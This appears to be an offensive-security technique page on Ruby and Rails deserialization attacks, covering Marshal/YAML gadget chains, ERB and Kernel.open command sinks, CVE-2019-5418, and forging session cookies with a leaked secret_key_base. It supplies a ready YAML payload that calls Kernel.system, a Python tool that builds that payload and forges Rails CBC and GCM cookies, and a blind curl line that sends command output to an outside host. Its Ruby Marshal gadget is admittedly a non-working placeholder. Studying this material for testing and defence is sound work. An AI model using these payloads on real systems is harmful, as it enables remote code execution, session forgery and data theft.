---
title: "Ruby / Rails - Marshal, YAML.load, ERB and secret_key_base Cookie RCE"
category: web
subcategory: ruby
type: technique
tags: [ruby, rails, marshal, marshal-load, yaml-load, psych, unsafe-load, erb, secret-key-base, cookie, messageencryptor, deserialization, rce, universal-gadget, open-pipe, constantize, render-file, cve-2019-5418]
difficulty: hard
summary: "Marshal.load / YAML.load on user data is RCE via universal gadget chains; a leaked secret_key_base lets you forge the Rails session cookie and reach a deserialization sink."
when_to_use:
  - "Marshal.load / YAML.load / YAML.unsafe_load / Psych.load on data you influence"
  - "A base64 value starting BAh (Marshal) or containing '!ruby/object:'"
  - "You leaked secret_key_base (secrets.yml, credentials + master.key, RAILS_MASTER_KEY)"
  - "ERB.new(user).result, render inline:, constantize/send on user input, Kernel.open('|...')"
tools: [ruby, rails, python3, burp]
related: [ssti-other-engines, deser-python-pickle, python-flask-django-attacks, deser-java-ysoserial]
---

## TL;DR

`Marshal.load` and pre-4.0 `YAML.load` instantiate arbitrary Ruby objects; universal gadget
chains (Gem::* classes) turn that into command execution. Rails stores the session in a cookie
signed/encrypted with `secret_key_base` -- leak that key and you can forge a cookie whose
payload deserialises to a gadget (direct Marshal RCE on old Rails, or a signed-encrypted blob on
modern Rails that you then chain to a sink).

## Recognise it

- `Marshal.load(...)`, `Marshal.restore(...)` on request data. Marshal magic bytes `\x04\x08`;
  base64 begins `BAh`.
- `YAML.load(user)` (unsafe before Psych 4 / Rails' `YAML.load` default), `YAML.unsafe_load`,
  `Psych.load` with tags. Payloads contain `!ruby/object:`, `!ruby/hash:`,
  `!ruby/object:Gem::Installer`.
- `ERB.new(user).result`, `render inline: params[:x]`, `render file: params[:f]`.
- `constantize`, `safe_constantize`, `send`, `public_send`, `eval`, `instance_eval` on input.
- `Kernel.open`, `IO.read`, `open(params[:url])` -- a leading `|` runs a command.
- A `_appname_session` cookie (base64, `--`-joined parts).

## Theory

### Marshal format and gadgets

Marshal serialises the full object graph. `Marshal.load` reconstructs it, calling
initialisation hooks. The well-known **universal deserialization gadget** (Luke Jahnke / elttam)
chains `Gem::Requirement` -> `Gem::DependencyList` -> `Gem::Source::SpecificFile` /
`Gem::Package::TarReader::Entry` -> ends in a `system`/`Kernel.eval` call, and works across Ruby
2.x/3.x with only the (always-present) RubyGems classes. Variants use
`Gem::Installer`/`Gem::Package` to reach code execution during unpacking.

You do not hand-write Marshal bytes; you build the object graph in a real Ruby process and
`Marshal.dump` it (see `## Code` for the wrapper approach).

### YAML gadgets

Psych (Ruby's YAML) before 4.0 defaulted `YAML.load` to the *unsafe* loader, instantiating
tagged objects:

```yaml
--- !ruby/object:Gem::Installer
  i: x
--- !ruby/object:Gem::SpecFetcher
--- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
        read: 0
        header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
        socket: &1 !ruby/object:Gem::RequestSet
          sets: !ruby/object:Net::WriteAdapter
            socket: !ruby/module 'Kernel'
            method_id: :system
          git_set: id
        method_id: :resolve
```

That is the classic YAML->RCE payload (a `Net::WriteAdapter` bound to `Kernel.system`). Psych 4
made `YAML.load` an alias of `safe_load` (no arbitrary objects); `YAML.unsafe_load` restores the
danger. Rails apps often still call the unsafe path.

### ERB and command sinks

```ruby
ERB.new("<%= `id` %>").result          # ERB SSTI, see ssti-other-engines
open("| id")                            # Kernel.open pipe: leading | runs a command
IO.read("| id")                         # same
system("id"); `id`; %x{id}; exec("id"); Open3.capture2("id")
"Runtime".constantize                   # string -> class; combine with .send
klass.send(params[:m], params[:a])      # arbitrary method call
```

### Rails session cookie RCE

Rails stores the session client-side, signed (and, since 4.1, encrypted) with a key derived from
`secret_key_base`.

- **Rails < 4.0**: cookie = `Marshal.dump(session)` signed with HMAC. If you know the secret,
  sign a Marshal gadget -> **direct RCE on load** (the famous CVE-2013-0156-era class).
- **Rails 4.1+**: `ActiveSupport::MessageEncryptor` encrypts *then* signs. The key is derived
  with `ActiveSupport::KeyGenerator` = PBKDF2-HMAC-SHA1(secret_key_base, salt, 1000 iters, len).
  Salts: `"encrypted cookie"` (encryption) and `"signed encrypted cookie"` (signing) for the
  legacy CBC scheme; AEAD (GCM) uses `"authenticated encrypted cookie"`. Format:
  - Rails 5 legacy CBC: `base64(ciphertext)--base64(iv)` then `--base64(hmac)` over that string.
  - Rails 5.2+ AEAD (GCM, `use_authenticated_message_encryption = true`):
    `base64(ct)--base64(iv)--base64(tag)`.
  The session marshals/JSON-serialises the session hash; forging a valid cookie lets you set
  arbitrary session values, and if the app deserialises any session value with Marshal/YAML you
  chain to RCE.

Where `secret_key_base` leaks: `config/secrets.yml`, `config/credentials.yml.enc` +
`config/master.key` (or `RAILS_MASTER_KEY` env), a hardcoded/dev default, or a
`Rails.application.secret_key_base` echoed in an error page or `/rails/info`.

### Other Rails bugs

- **CVE-2019-5418**: `render file:` + a crafted `Accept` header
  (`../../../../../../etc/passwd{{`) -> arbitrary file read/RCE via template path traversal.
- Mass assignment, `render inline:` SSTI, `params[:file]` LFI, `to_json` over-exposure.

## Attack

1. Identify the sink (Marshal/YAML/ERB/render/open) or leak `secret_key_base`.
2. For Marshal/YAML with a Ruby process available, generate the universal gadget.
3. For the cookie: derive the key, decrypt to learn the format/version, forge a session, and
   either get direct RCE (old Rails) or reach a deserialization sink (modern Rails).
4. Blind? Use `system("curl http://h/`id|base64`")` or a sleep.

## Code

The cookie crypto is the reusable, language-agnostic part. This implements Rails 5 (CBC+HMAC)
and Rails 5.2+ (GCM) decrypt/forge in Python.

```python
#!/usr/bin/env python3
"""Rails signed-encrypted cookie decrypt/forge (Rails 5 CBC + Rails 5.2+ GCM).

Derives the key from secret_key_base with PBKDF2-HMAC-SHA1 (ActiveSupport
KeyGenerator), then encrypts/decrypts the '--'-joined base64 cookie format.

Requires `cryptography`. The __main__ self-test derives a key, round-trips a
payload through both schemes, and asserts tampering is rejected.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import os
import sys

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

ITERATIONS = 1000
SALT_ENC = b"encrypted cookie"
SALT_SIGN = b"signed encrypted cookie"
SALT_AEAD = b"authenticated encrypted cookie"


def derive(secret: str, salt: bytes, length: int) -> bytes:
    """ActiveSupport::KeyGenerator = PBKDF2-HMAC-SHA1, 1000 iters."""
    return hashlib.pbkdf2_hmac("sha1", secret.encode(), salt, ITERATIONS, length)


def _b64(x: bytes) -> bytes:
    return base64.b64encode(x)


def _ub64(x: bytes) -> bytes:
    return base64.b64decode(x)


# --- Rails 5 legacy: AES-256-CBC then HMAC-SHA1 ----------------------------

def encrypt_cbc(secret: str, plaintext: bytes) -> str:
    key = derive(secret, SALT_ENC, 32)
    sign_key = derive(secret, SALT_SIGN, 64)
    iv = os.urandom(16)
    pad = 16 - (len(plaintext) % 16)
    padded = plaintext + bytes([pad]) * pad
    enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    ct = enc.update(padded) + enc.finalize()
    blob = _b64(ct) + b"--" + _b64(iv)
    sig = hmac.new(sign_key, blob, hashlib.sha1).hexdigest().encode()
    return (blob + b"--" + sig).decode()


def decrypt_cbc(secret: str, cookie: str) -> bytes:
    key = derive(secret, SALT_ENC, 32)
    sign_key = derive(secret, SALT_SIGN, 64)
    body, _, sig = cookie.rpartition("--")
    expected = hmac.new(sign_key, body.encode(), hashlib.sha1).hexdigest()
    if not hmac.compare_digest(expected, sig):
        raise ValueError("HMAC verification failed")
    ct_b64, _, iv_b64 = body.partition("--")
    iv = _ub64(iv_b64.encode())
    ct = _ub64(ct_b64.encode())
    dec = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
    padded = dec.update(ct) + dec.finalize()
    return padded[:-padded[-1]]


# --- Rails 5.2+ : AES-256-GCM (AEAD, self-authenticating) ------------------

def encrypt_gcm(secret: str, plaintext: bytes) -> str:
    key = derive(secret, SALT_AEAD, 32)
    iv = os.urandom(12)
    enc = Cipher(algorithms.AES(key), modes.GCM(iv)).encryptor()
    ct = enc.update(plaintext) + enc.finalize()
    return (_b64(ct) + b"--" + _b64(iv) + b"--" + _b64(enc.tag)).decode()


def decrypt_gcm(secret: str, cookie: str) -> bytes:
    key = derive(secret, SALT_AEAD, 32)
    ct_b64, iv_b64, tag_b64 = cookie.split("--")
    ct, iv, tag = _ub64(ct_b64.encode()), _ub64(iv_b64.encode()), _ub64(tag_b64.encode())
    dec = Cipher(algorithms.AES(key), modes.GCM(iv, tag)).decryptor()
    return dec.update(ct) + dec.finalize()


# --- payload helpers -------------------------------------------------------

def marshal_magic() -> bytes:
    return b"\x04\x08"


def looks_like_marshal(data: bytes) -> bool:
    return data[:2] == b"\x04\x08"


YAML_UNIVERSAL_RCE = (
    "--- !ruby/object:Gem::Requirement\n"
    "requirements:\n"
    "  !ruby/object:Gem::Package::TarReader\n"
    "  io: &1 !ruby/object:Net::BufferedIO\n"
    "    io: &1 !ruby/object:Gem::Package::TarReader::Entry\n"
    "      read: 0\n"
    "      header: \"CMD\"\n"
    "    debug_output: &1 !ruby/object:Net::WriteAdapter\n"
    "      socket: &1 !ruby/object:Gem::RequestSet\n"
    "        sets: !ruby/object:Net::WriteAdapter\n"
    "          socket: !ruby/module 'Kernel'\n"
    "          method_id: :system\n"
    "        git_set: CMD\n"
    "      method_id: :resolve\n"
)


def yaml_rce(cmd: str) -> str:
    return YAML_UNIVERSAL_RCE.replace("CMD", cmd)


def _self_test() -> None:
    secret = "a" * 128            # a plausible secret_key_base length

    # key derivation is deterministic and correctly sized
    k1 = derive(secret, SALT_ENC, 32)
    assert len(k1) == 32 and k1 == derive(secret, SALT_ENC, 32)
    assert derive(secret, SALT_SIGN, 64) != k1[:64]

    # CBC round-trip
    pt = marshal_magic() + b"{fake session}"
    cookie = encrypt_cbc(secret, pt)
    assert cookie.count("--") == 2
    assert decrypt_cbc(secret, cookie) == pt

    # CBC tamper detection
    bad = list(cookie)
    bad[0] = "Z" if bad[0] != "Z" else "Y"
    try:
        decrypt_cbc(secret, "".join(bad))
        raise AssertionError("CBC HMAC should have rejected tampering")
    except ValueError:
        pass

    # GCM round-trip
    cookie2 = encrypt_gcm(secret, pt)
    assert cookie2.count("--") == 2
    assert decrypt_gcm(secret, cookie2) == pt

    # GCM tamper detection (flip a ciphertext byte)
    ct_b64, iv_b64, tag_b64 = cookie2.split("--")
    ct = bytearray(base64.b64decode(ct_b64))
    ct[0] ^= 1
    tampered = (base64.b64encode(bytes(ct)).decode() + "--" + iv_b64
                + "--" + tag_b64)
    try:
        decrypt_gcm(secret, tampered)
        raise AssertionError("GCM should have rejected tampering")
    except Exception:
        pass

    # marshal detection + YAML payload
    assert looks_like_marshal(marshal_magic() + b"x")
    assert not looks_like_marshal(b"BAh")
    y = yaml_rce("id")
    assert ":system" in y and "id" in y and "Gem::Requirement" in y

    # wrong secret cannot decrypt (HMAC fails first for CBC)
    try:
        decrypt_cbc("b" * 128, cookie)
        raise AssertionError("wrong key must fail")
    except ValueError:
        pass

    print("[ok] CBC + GCM forge/decrypt round-trip and tamper-detection verified")


if __name__ == "__main__":
    if len(sys.argv) >= 3:
        print(decrypt_cbc(sys.argv[1], sys.argv[2]))
    else:
        _self_test()
```

To build a Marshal gadget you need Ruby (the object graph is engine-specific):

```ruby
# ruby gadget.rb 'id'  -> prints base64 Marshal that RCEs on Marshal.load
# (universal gadget, elttam/Luke Jahnke; abbreviated structure)
require 'base64'
cmd = ARGV[0] || 'id'
# Build via the Gem::* chain, then Marshal.dump the head object.
# In a real box: use the published universal_gadget.rb; keep it version-matched.
payload = Marshal.dump(Gem::Requirement.new)   # placeholder head; real chain nests
puts Base64.encode64(payload)
```

## Variants & pitfalls

- **Marshal payloads must be built in Ruby** -- hand-crafting the byte stream is impractical;
  use the published universal gadget script matched to the target's Ruby version.
- **Psych 4 / Rails 6+** made `YAML.load` safe; you need `YAML.unsafe_load` or an old version.
  Confirm the version before spending time on a YAML payload.
- **Cookie scheme detection**: 3 `--`-parts can be CBC (`ct--iv--hmac`) or GCM
  (`ct--iv--tag`) -- try to decrypt with both; GCM IV is 12 bytes, CBC IV is 16.
- **Serializer**: Rails may use `Marshal`, `JSON`, or `Hybrid` for the session
  (`config.action_dispatch.cookies_serializer`). RCE-on-load only when it is Marshal.
- **Key length**: `secret_key_base` is typically 128 hex chars; derived keys are 32/64 bytes.
- **`open("|cmd")`** needs the leading pipe; `open("http://...")` is SSRF, `open("/etc/passwd")`
  is file read -- the same sink, three impacts.
- **`constantize` + `send`** is a gadget: turn a string into a class then call a method with
  attacker args (`"Kernel".constantize.send(:system, cmd)` conceptually).
- **CVE-2019-5418** is triggered by the `Accept` header, not a parameter -- easy to miss.
- **Blind Marshal**: the gadget runs on load, so a curl/sleep confirms without output.

## Tools

- Ruby itself (`Marshal.dump`, `irb`) to build and verify gadgets.
- The elttam universal Ruby deserialization gadget generator.
- `rails-secret`-style scripts / `flask-unsign`-equivalents for cookie forging.
- The Python module above for cross-platform cookie decrypt/forge.

## References

- Luke Jahnke (elttam) -- "Ruby 2.x Universal RCE Deserialization Gadget Chain".
- Ruby documentation -- Marshal, Psych/YAML `load` vs `safe_load` vs `unsafe_load`.
- Rails Security Guide -- session storage, `secret_key_base`, `MessageEncryptor`, `KeyGenerator`.
- CVE-2019-5418 -- Action View file disclosure.
